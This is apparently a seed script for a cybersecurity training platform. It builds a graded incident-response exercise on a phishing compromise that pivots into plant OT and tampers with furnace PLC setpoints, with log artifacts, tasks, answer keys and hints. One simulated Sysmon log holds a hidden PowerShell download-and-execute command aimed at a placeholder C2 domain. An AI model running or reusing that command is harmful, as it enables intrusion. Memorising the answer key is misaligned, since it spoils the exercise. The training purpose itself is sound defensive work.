// Seeds Boss Fight simulation: MFG-2026-004 — IT-to-OT Pivot and PLC
// Tampering, inside the Ironforge Manufacturing CompanyEnvironment.
// Requires scripts/seed-companies.ts to have been run first.
//
// Randomized: uses {{TOKEN}} placeholders substituted per-student by
// src/lib/incident-randomizer.ts.
//
// Idempotent — safe to run multiple times. Run: npx tsx scripts/seed-incident-mfg-2026-004.ts

import { PrismaClient } from "@prisma/client";

const db = new PrismaClient();

const ARTIFACTS = [
  {
    order: 1,
    type: "EMAIL" as const,
    tactic: "INITIAL_ACCESS" as const,
    title: "Suspicious Email — {{EMPLOYEE_USER}}@ironforgemfg.com",
    content: `From: "Plant Safety Compliance" <audit@{{LOOKALIKE_DOMAIN}}>
To: {{EMPLOYEE_USER}}@ironforgemfg.com
Sent: {{ATTACK_DATE}} {{ATTACK_TIME}}
Subject: URGENT: Furnace Line Safety Inspection Checklist — Sign Today

Hi {{EMPLOYEE_NAME}},

Corporate safety compliance needs the attached checklist reviewed and
signed before tomorrow's plant floor inspection. Please open and enable
content to view the digital signature field.

Attachment: Safety_Inspection_Checklist.xlsm

Thanks,
Plant Safety Compliance

--- Note from IT: the real Ironforge domain is ironforgemfg.com. This
sender's domain is {{LOOKALIKE_DOMAIN}}. ---`,
  },
  {
    order: 2,
    type: "EVENT_LOG" as const,
    tactic: null,
    title: "Windows Security Event Log — {{PATIENT_ZERO_HOST}}",
    content: `EventID 4688 (Process Creation)
  New Process: EXCEL.EXE "C:\\Users\\{{EMPLOYEE_USER}}\\Downloads\\Safety_Inspection_Checklist.xlsm"
  Parent Process: outlook.exe

EventID 4624 (Logon)
  Logon Type: 3 (Network)
  Source Workstation: {{PATIENT_ZERO_HOST}}
  Target: {{FILE_SERVER_HOST}}
  Account Name: {{ADMIN_ACCOUNT}}  (local admin on {{FILE_SERVER_HOST}})

EventID 5140 (Network Share Access)
  Share: \\\\{{FILE_SERVER_HOST}}\\HMI_Historian$
  Source: {{PATIENT_ZERO_HOST}}

Note from IT: {{FILE_SERVER_HOST}} is the HMI historian server on the OT
network. The corporate IT VLAN and the OT VLAN are nominally segmented by a
single firewall pair, but the rule set is looser than intended — this
connection should not have been possible.`,
  },
  {
    order: 3,
    type: "SYSMON_LOG" as const,
    tactic: null,
    title: "Sysmon Event Log — {{PATIENT_ZERO_HOST}}",
    content: `Event ID 1 (Process Create)
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
  CommandLine: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('hxxp://{{C2_DOMAIN}}/upd.ps1')"

Event ID 1 (Process Create)
  Image: C:\\Windows\\Temp\\plantsvc32.exe
  ParentImage: powershell.exe

Event ID 3 (Network Connection)  (every ~300s after)
  Image: plantsvc32.exe
  DestinationIp: {{C2_IP}}
  DestinationPort: 443
  DestinationHostname: {{C2_DOMAIN}}`,
  },
  {
    order: 4,
    type: "REGISTRY" as const,
    tactic: "PERSISTENCE" as const,
    title: "Registry Export — {{PATIENT_ZERO_HOST}} (HKCU Run Keys)",
    content: `[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"PlantSvcHelper"="C:\\\\Windows\\\\Temp\\\\plantsvc32.exe"

Key created: {{ATTACK_DATE}}
Last modified by: {{EMPLOYEE_USER}} (via the macro's elevated session)`,
  },
  {
    order: 5,
    type: "PCAP_SUMMARY" as const,
    tactic: "COMMAND_AND_CONTROL" as const,
    title: "Firewall/PCAP Summary — Egress Traffic from {{PATIENT_ZERO_HOST}}",
    content: `Destination: {{C2_IP}}:443 ({{C2_DOMAIN}})
Protocol: TLS (self-signed certificate)
Pattern: Beacon every ~300 seconds
Total sessions: 163
Classification: Matches known C2 beaconing cadence pattern`,
  },
  {
    order: 6,
    type: "EVENT_LOG" as const,
    tactic: "LATERAL_MOVEMENT" as const,
    title: "Firewall Rule Log — IT-to-OT Traffic to {{FILE_SERVER_HOST}}",
    content: `Firewall rule matched: ALLOW-IT-OT-LEGACY-01
  Source: {{PATIENT_ZERO_HOST}} (Corporate IT VLAN)
  Destination: {{FILE_SERVER_HOST}} (OT VLAN — HMI Historian)
  Protocol: SMB (445/tcp)
  Account: {{ADMIN_ACCOUNT}}

Rule Description (from firewall config, dated 6 years ago): "Temporary rule
for historian data sync project — REMOVE AFTER PROJECT CLOSEOUT."
The rule was never removed.`,
  },
  {
    order: 7,
    type: "FILE_LISTING" as const,
    tactic: "IMPACT" as const,
    title: "HMI Historian Command Log — {{FILE_SERVER_HOST}}",
    content: `Commands issued from {{FILE_SERVER_HOST}} to Furnace Line PLC-07:

  SETPOINT_CHANGE  Furnace_Temp_Max: 1450C → 1620C  (exceeds rated safe maximum)
  SETPOINT_CHANGE  Conveyor_EStop_Enabled: TRUE → FALSE
  SETPOINT_CHANGE  Coolant_Flow_Min: 40L/min → 12L/min

Plant floor operators noticed abnormal furnace temperature readings and
manually triggered a physical emergency stop before any equipment damage or
injury occurred, overriding the software-disabled E-stop.`,
  },
  {
    order: 8,
    type: "TIMELINE" as const,
    tactic: null,
    title: "Consolidated Incident Timeline",
    content: `{{ATTACK_DATE}} {{ATTACK_TIME}}  Phishing email received (lookalike domain {{LOOKALIKE_DOMAIN}})
+5 min   Attachment opened, macro executes, PowerShell download cradle runs
+6 min   Payload (plantsvc32.exe) dropped, Run key persistence established
+7 min   C2 beaconing begins ({{C2_IP}} / {{C2_DOMAIN}})
+25 min  Lateral movement across a forgotten firewall rule to {{FILE_SERVER_HOST}} (OT VLAN) using {{ADMIN_ACCOUNT}}
+40 min  Unsafe setpoint changes issued to Furnace Line PLC-07, including disabling the software E-stop
+42 min  Plant floor operators notice abnormal readings and manually trigger a physical emergency stop
+45 min  Production halted; incident response engaged`,
  },
];

const NETWORK_NODES = [
  { id: "fw", label: "IT/OT Segmentation Firewall", kind: "firewall", x: 45, y: 45 },
  { id: "patient-zero", label: "{{PATIENT_ZERO_HOST}}", kind: "workstation", x: 15, y: 25 },
  { id: "dc", label: "Corporate Domain Controller", kind: "domain-controller", x: 15, y: 70 },
  { id: "hmi", label: "{{FILE_SERVER_HOST}}", kind: "server", x: 80, y: 25 },
  { id: "plc", label: "Furnace Line PLC-07", kind: "server", x: 80, y: 70 },
  { id: "c2", label: "{{C2_DOMAIN}}", kind: "internet", x: 15, y: 45 },
];

const NETWORK_EVENTS = [
  { triggerOrder: 1, nodeId: "patient-zero", status: "suspicious", note: "Flagged as the likely patient-zero host" },
  { triggerOrder: 2, nodeId: "patient-zero", status: "compromised", note: "Malicious macro executed — initial foothold confirmed" },
  { triggerOrder: 4, nodeId: "c2", status: "compromised", note: "Identified as the malware's C2 infrastructure" },
  { triggerOrder: 4, nodeId: "fw", status: "suspicious", note: "Egress traffic to C2 confirmed in PCAP" },
  { triggerOrder: 5, nodeId: "fw", status: "compromised", note: "Forgotten rule permitting IT-to-OT traffic located" },
  { triggerOrder: 5, nodeId: "hmi", status: "compromised", note: "Accessed via the forgotten IT-to-OT firewall rule" },
  { triggerOrder: 5, nodeId: "plc", status: "compromised", note: "Unsafe setpoint changes issued, including disabling the E-stop" },
  { triggerOrder: 7, nodeId: "patient-zero", status: "contained", note: "Isolated from the network" },
  { triggerOrder: 7, nodeId: "hmi", status: "contained", note: "Isolated; setpoints manually restored to safe values" },
  { triggerOrder: 7, nodeId: "plc", status: "contained", note: "E-stop re-enabled and verified; setpoints confirmed safe" },
  { triggerOrder: 7, nodeId: "fw", status: "contained", note: "Legacy IT-to-OT rule removed" },
  { triggerOrder: 7, nodeId: "dc", status: "contained", note: "Compromised admin credentials rotated" },
  { triggerOrder: 7, nodeId: "c2", status: "contained", note: "Blocked at the perimeter firewall" },
];

const TASKS = [
  {
    order: 1,
    title: "Find Patient Zero",
    prompt: "Based on the phishing email and the event log, which single workstation is patient zero for this incident?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "{{PATIENT_ZERO_HOST}}",
    options: [] as string[],
    points: 110,
    hints: [
      { level: 1, pointCost: 20, text: "Check which workstation the phishing attachment was opened on in the event log." },
      { level: 2, pointCost: 30, text: "The 4688 process creation event for EXCEL.EXE opening the attachment names the host." },
      { level: 3, pointCost: 40, text: "It's the host named in the 4688 event for the attachment's Excel process." },
    ],
  },
  {
    order: 2,
    title: "Identify Initial Access",
    prompt: "What was the initial access vector used to compromise patient zero?",
    answerType: "RADIO" as const,
    correctAnswer: "Spearphishing email with a malicious macro-enabled Excel attachment",
    options: [
      "Spearphishing email with a malicious macro-enabled Excel attachment",
      "Exploitation of an unpatched PLC directly from the internet",
      "Password spraying against an externally exposed RDP service",
      "A malicious USB drive left on the plant floor",
    ],
    points: 110,
    hints: [
      { level: 1, pointCost: 20, text: "Look at how the very first process (EXCEL.EXE) came to run on patient zero." },
      { level: 2, pointCost: 30, text: "The email artifact shows a lookalike sender domain and a macro-enabled attachment." },
      { level: 3, pointCost: 40, text: "It's the phishing email with the macro-enabled attachment." },
    ],
  },
  {
    order: 3,
    title: "Find the Malware Hash",
    prompt: "The Sysmon log doesn't include a file hash directly — but you can still identify the payload. What is the exact filename of the dropped payload?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "plantsvc32.exe",
    options: [],
    points: 120,
    hints: [
      { level: 1, pointCost: 20, text: "Check the Sysmon artifact for the process dropped by the PowerShell download cradle." },
      { level: 2, pointCost: 30, text: "It's the Image path listed in the second Process Create event." },
      { level: 3, pointCost: 40, text: "It's the filename in C:\\Windows\\Temp\\, without the path." },
    ],
  },
  {
    order: 4,
    title: "Find the C2 Domain",
    prompt: "What C2 domain did the malware beacon to?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "{{C2_DOMAIN}}",
    options: [],
    points: 120,
    hints: [
      { level: 1, pointCost: 20, text: "Check the Sysmon network connection events and the PCAP summary artifact." },
      { level: 2, pointCost: 30, text: "The destination hostname appears in both Sysmon Event ID 3 and the firewall/PCAP summary." },
      { level: 3, pointCost: 40, text: "It's the DestinationHostname value shared by both artifacts." },
    ],
  },
  {
    order: 5,
    title: "Map to MITRE ATT&CK",
    prompt: "Which MITRE ATT&CK technique best describes the lateral movement from patient zero into the OT network?",
    answerType: "RADIO" as const,
    correctAnswer: "T1021.002 – Remote Services: SMB/Windows Admin Shares",
    options: [
      "T1021.002 – Remote Services: SMB/Windows Admin Shares",
      "T1210 – Exploitation of Remote Services",
      "T1078 – Valid Accounts (Cloud)",
      "T1570 – Lateral Tool Transfer only, no authentication involved",
    ],
    points: 140,
    hints: [
      { level: 1, pointCost: 20, text: "Look at the logon type and share access event in the firewall rule log." },
      { level: 2, pointCost: 30, text: "SMB share access using stolen local admin credentials, through a forgotten firewall rule, is the mechanism." },
      { level: 3, pointCost: 40, text: "It's SMB/Windows admin shares — T1021.002." },
    ],
  },
  {
    order: 6,
    title: "Design Detection Logic",
    prompt: "You need a detection rule to catch this IT-to-OT crossing across the fleet. Which single condition should the detection primarily match on?",
    answerType: "RADIO" as const,
    correctAnswer: "Any SMB/admin-share connection sourced from the corporate IT VLAN destined for the OT VLAN, which should never legitimately occur",
    options: [
      "Any SMB/admin-share connection sourced from the corporate IT VLAN destined for the OT VLAN, which should never legitimately occur",
      "Any process named plantsvc32.exe, regardless of network behavior",
      "The username that owns the corporate workstation",
      "The process's working directory path on the target host",
    ],
    points: 140,
    hints: [
      { level: 1, pointCost: 20, text: "The real problem here is architectural — traffic crossing a boundary that shouldn't exist." },
      { level: 2, pointCost: 30, text: "Detecting on the VLAN-crossing pattern catches this regardless of which specific malware is used." },
      { level: 3, pointCost: 40, text: "Detect on IT-to-OT VLAN-crossing SMB traffic, not just the specific payload." },
    ],
  },
  {
    order: 7,
    title: "Recommend Containment",
    prompt: "Unsafe setpoints have already been pushed to a live furnace PLC. What's the correct immediate containment action?",
    answerType: "RADIO" as const,
    correctAnswer: "Isolate patient zero and the HMI historian, remove the legacy IT-to-OT firewall rule, and verify PLC setpoints are restored to safe values before resuming normal production",
    options: [
      "Isolate patient zero and the HMI historian, remove the legacy IT-to-OT firewall rule, and verify PLC setpoints are restored to safe values before resuming normal production",
      "Immediately power off the entire OT network without checking current PLC state first",
      "Only reset the phished employee's email password",
      "Ignore it since plant floor operators already caught the problem manually",
    ],
    points: 160,
    hints: [
      { level: 1, pointCost: 20, text: "A live safety issue on a physical process needs verification, not just a network-only fix." },
      { level: 2, pointCost: 30, text: "Cut the network access that enabled this, and confirm the physical process is actually back in a safe state." },
      { level: 3, pointCost: 40, text: "Isolate the affected hosts, remove the bad firewall rule, and verify the PLC is safe — don't blind-power-cycle OT and don't just stop at IT." },
    ],
  },
  {
    order: 8,
    title: "Produce the Executive Summary",
    prompt: "Which sentence best captures the root cause for the executive summary of your incident report?",
    answerType: "RADIO" as const,
    correctAnswer: "A spearphishing email compromised a corporate workstation, which pivoted into the OT network through a six-year-old forgotten firewall rule and issued unsafe setpoint changes to a production furnace PLC",
    options: [
      "A spearphishing email compromised a corporate workstation, which pivoted into the OT network through a six-year-old forgotten firewall rule and issued unsafe setpoint changes to a production furnace PLC",
      "An unpatched PLC was directly exploited from the public internet",
      "A disgruntled plant operator intentionally sabotaged the furnace line",
      "The incident was caused by ransomware encrypting the HMI historian",
    ],
    points: 180,
    hints: [
      { level: 1, pointCost: 25, text: "Trace the chain from the phishing email all the way through to the PLC setpoint changes." },
      { level: 2, pointCost: 35, text: "The root cause statement should name the phishing entry point and the forgotten firewall rule as the enabling factor for OT impact." },
      { level: 3, pointCost: 45, text: "Entry via phishing, pivot via the forgotten IT-to-OT firewall rule, impact is unsafe PLC setpoint changes." },
    ],
  },
];

async function main() {
  const company = await db.companyEnvironment.findUnique({ where: { slug: "ironforge-manufacturing" } });
  if (!company) {
    throw new Error("Run scripts/seed-companies.ts first — ironforge-manufacturing not found.");
  }

  const briefing =
    "Ironforge Manufacturing's plant floor operators manually triggered an emergency stop after noticing abnormal " +
    "furnace temperature readings and a disabled software E-stop. The SOC has pulled artifacts from the suspected " +
    "patient-zero corporate workstation and the OT-side HMI historian. You are the lead incident responder. Work " +
    "through the evidence below to reconstruct the full attack chain, then produce detection content, a containment " +
    "recommendation, and an executive summary.";

  const sim = await db.incidentSimulation.upsert({
    where: { slug: "mfg-2026-004-ot-compromise" },
    update: {
      codename: "MFG-2026-004",
      title: "IT-to-OT Pivot and PLC Tampering",
      companyId: company.id,
      briefing,
      difficulty: "INSANE",
      estimatedMinutes: 190,
      points: 1260,
      published: true,
      randomized: true,
      isCapstone: true,
      networkNodes: NETWORK_NODES,
      networkEvents: NETWORK_EVENTS,
    },
    create: {
      slug: "mfg-2026-004-ot-compromise",
      codename: "MFG-2026-004",
      title: "IT-to-OT Pivot and PLC Tampering",
      companyId: company.id,
      briefing,
      difficulty: "INSANE",
      estimatedMinutes: 190,
      points: 1260,
      published: true,
      randomized: true,
      isCapstone: true,
      networkNodes: NETWORK_NODES,
      networkEvents: NETWORK_EVENTS,
    },
  });

  await db.incidentSimArtifact.deleteMany({ where: { simulationId: sim.id } });
  await db.incidentSimArtifact.createMany({
    data: ARTIFACTS.map((a) => ({
      simulationId: sim.id,
      type: a.type,
      title: a.title,
      content: a.content,
      order: a.order,
      tactic: a.tactic,
    })),
  });

  await db.incidentSimTask.deleteMany({ where: { simulationId: sim.id } });
  for (const t of TASKS) {
    const task = await db.incidentSimTask.create({
      data: {
        simulationId: sim.id,
        order: t.order,
        title: t.title,
        prompt: t.prompt,
        answerType: t.answerType,
        correctAnswer: t.correctAnswer,
        options: t.options,
        points: t.points,
      },
    });
    await db.incidentSimHint.createMany({
      data: t.hints.map((h) => ({ taskId: task.id, level: h.level, pointCost: h.pointCost, text: h.text })),
    });
  }

  console.log(`✓ MFG-2026-004 seeded: ${ARTIFACTS.length} artifacts, ${TASKS.length} tasks.`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => db.$disconnect());
